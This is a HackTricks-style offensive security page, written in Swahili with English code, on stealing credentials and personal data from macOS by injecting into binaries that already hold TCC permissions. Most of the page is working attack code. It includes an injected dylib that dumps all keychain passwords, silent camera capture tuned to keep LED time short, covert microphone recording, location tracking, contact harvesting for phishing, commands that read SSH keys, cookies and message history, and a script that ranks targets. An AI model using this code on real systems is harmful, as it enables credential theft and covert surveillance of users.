# Wizi wa Credentials na Data za macOS kupitia Ruhusa za TCC

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

macOS TCC (Uwazi, Idhini, na Udhibiti) inalinda upatikanaji wa data nyeti za mtumiaji. Wakati mshambuliaji **anapochukua udhibiti wa binary ambayo tayari ina ruhusa za TCC**, wanarithi ruhusa hizo. Ukurasa huu unaelezea uwezo wa kuchochea matumizi ya kila ruhusa ya TCC inayohusiana na wizi wa data.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **inarithi kimya ruhusa zote za TCC za binary hiyo**. Hakuna onyo au uthibitisho wa ziada wakati mchakato ule ule unaposoma data zinazolindwa.

---

## Vikundi vya Upatikanaji vya Keychain

### Zawadi

Keychain ya macOS inahifadhi:
- **Wi-Fi passwords** — nywila zote za mitandao isiyotumia waya zilizohifadhiwa
- **Website passwords** — nenosiri za tovuti: Safari, Chrome (wakati wakitumia Keychain), na vivinjari vingine
- **Application passwords** — akaunti za barua pepe, kredenshia za VPN, tokeni za maendeleo
- **Certificates and private keys** — code signing, TLS ya mteja, usimbaji S/MIME
- **Secure notes** — siri zilizohifadhiwa na mtumiaji

### Ruhusa: `keychain-access-groups`

Vipengee vya Keychain vimepangwa kwa **vikundi vya upatikanaji**. Ruhusa ya programu `keychain-access-groups` inaorodhesha vikundi ambavyo inaweza kufikia:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Utekelezaji
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Ufikiaji wa Kamera (kTCCServiceCamera)

### Exploitation

Binary yenye ruhusa ya TCC ya kamera (kupitia `kTCCServiceCamera` au `com.apple.security.device.camera` entitlement) inaweza kunasa picha na video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Kuanzia na **macOS Sonoma**, kiashiria cha kamera kwenye bar ya menyu ni cha kudumu na hakiwezi kufichwa kwa njia ya programu. Kwa **matoleo ya zamani ya macOS**, upigaji picha mfupi unaweza usizalishe kiashiria kinachoonekana.

---

## Ufikiaji wa Maikrofoni (kTCCServiceMicrophone)

### Exploitation

Ufikiaji wa maikrofoni hurekodi sauti zote kutoka kwa maikrofoni iliyojengewa ndani, headset, au vifaa vingine vilivyounganishwa vya pembejeo ya sauti:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Shambulio: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---
## Ufuatiliaji wa Eneo (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Ufuatiliaji Endelevu
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Mawasiliano / Kalenda / Picha

### Utoaji wa Data Binafsi

| Huduma ya TCC | Framework | Taarifa |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Majina, barua pepe, nambari za simu, anwani |
| `kTCCServiceCalendar` | `EventKit` | Mikutano, washiriki, maeneo |
| `kTCCServicePhotos` | `Photos.framework` | Picha, picha za skrini, metadata ya eneo |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kukusanya Mawasiliano
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Ufikiaji wa Akaunti ya iCloud

### Ruhusa: `com.apple.private.icloud-account-access`

Ruhusa hii inaruhusu kuwasiliana na huduma ya XPC `com.apple.iCloudHelper`, ikitoa ufikiaji kwa:
- **iCloud tokens** — token za uthibitisho kwa Apple ID ya mtumiaji
- **iCloud Drive** — nyaraka zilizosawazishwa kutoka kwa vifaa vyote
- **iCloud Keychain** — nenosiri zilizosawazishwa katika vifaa vyote vya Apple
- **Find My** — eneo la vifaa vyote vya Apple vya mtumiaji
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Kuathiri iCloud-entitled binary kunapanua shambulio kutoka **kifaa kimoja hadi mfumo mzima wa Apple**: Macs nyingine, iPhones, iPads, Apple Watch. iCloud Keychain sync inamaanisha nywila kutoka kwa vifaa vyote zinaweza kupatikana.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### The Most Powerful TCC Permission

Full Disk Access inaruhusu uwezo wa kusoma **kila faili kwenye mfumo**, ikijumuisha:
- Data za programu nyingine (Messages, Mail, historia ya Safari)
- Hifadhidata za TCC (zikiweka wazi idhini zote nyingine)
- Funguo za SSH na usanidi
- Cookie za kivinjari na tokeni za kikao
- Hifadhidata za programu na cache
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Unapopima injectable TCC-granted binaries, panga kipaumbele kulingana na thamani ya data:

| Kipaumbele | TCC Permission | Kwa nini |
|---|---|---|
| **Muhimu sana** | Full Disk Access | Ufikiaji wa kila kitu |
| **Muhimu sana** | TCC Manager | Inaweza kutoa ruhusa yoyote |
| **Juu** | Keychain Access Groups | Nenosiri zote zilizohifadhiwa |
| **Juu** | iCloud Account Access | Kuathiri vifaa vingi |
| **Juu** | Input Monitoring (ListenEvent) | Keylogging |
| **Juu** | Accessibility | Udhibiti wa GUI, kujipa ruhusa |
| **Wastani** | Screen Capture | Ukamataji wa data za kuona |
| **Wastani** | Camera + Microphone | Ufuatiliaji |
| **Wastani** | Contacts + Calendar | Taarifa kwa social engineering |
| **Chini** | Location | Ufuatiliaji wa kimwili |
| **Chini** | Photos | Taarifa binafsi |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Marejeo

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
